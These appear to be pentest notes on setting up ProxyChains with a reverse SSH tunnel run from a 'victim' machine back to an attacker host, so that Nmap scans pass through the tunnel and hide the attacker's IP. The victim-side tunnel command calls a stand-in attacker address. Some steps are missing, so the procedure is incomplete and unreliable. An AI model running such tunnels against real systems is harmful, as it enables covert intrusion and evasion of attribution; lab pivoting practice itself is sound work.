Configuring ProxyChains for Enhanced Anonymity
Pre-requisites:
Ensure xclip is installed for RDP functionality.
On the Attacker Box:
1. Edit ProxyChains Configuration
If you haven't already configured ProxyChains, open the configuration file with:
sudo nano /etc/proxychains4.conf
Modify ProxyChains Configuration:
Comment out strict_chain
Uncomment dynamic_chain
Uncomment quiet_mode
Comment proxy_dns
Change the Default Config
from socks4 127.0.0.1 9080 to socks5 127.0.0.1 [YourPreferredPort] where [YourPreferredPort] is the port number you choose.

2. Verify SSH Service Status and Start if Necessary
Check if SSH service is running:
sudo systemctl status ssh.service
f the SSH service is not started, start it with:
3. Configure Port Forwarding Rule on pfSense
This step is crucial for setting up a tunnel from the victim machine back to the attacker's machine.

4. Establish SSH Tunnel from Victim Machine
On the victim's machine, run:
ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port
Note: This command will not produce output. Verify the connection by checking open ports on the attacker machine.

5. Use ProxyChains to Route Traffic through the SSH Tunnel
To perform an Nmap scan through the proxy, use:
sudo proxychains nmap -iL scope -F -sT -Pn | tee fast_scan
This step ensures that the scanning traffic is routed through the established SSH tunnel, leveraging the port forwarding rule for anonymity.

Additional Notes:
Ensure to refer to the wiki for screenshots and more detailed steps if necessary.
The process involves setting up an SSH tunnel from the victim machine to the attacker's machine, thereby allowing the attacker to route traffic (such as Nmap scans) through the tunnel, effectively masking their true IP address.
